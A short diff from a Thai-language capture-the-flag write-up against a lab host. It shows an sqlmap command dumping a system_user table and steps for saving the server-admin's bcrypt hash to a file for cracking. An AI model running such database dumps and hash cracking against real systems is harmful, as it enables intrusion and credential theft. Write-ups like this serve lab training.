@@ -167,5 +167,13 @@ sqlmap -u "http://10.10.28.30/products/3*" -D duckyinc --dump -T system_user
 ```bash
 mkdir ducky
 cd ducky
+```
 
+2. สร้างไฟล์ชื่อ hashes.txt เพื่อเก็บ hash:
 
+```bash
+nano hashes.txt
+```
+
+3. วาง bcrypt hash ที่ได้จาก sqlmap (ในที่นี้ใส่เฉพาะของ user server-admin)
+> 📌 แนะนำให้ลบ hash อื่น ๆ ออก เพื่อให้ crack ได้เร็วขึ้น
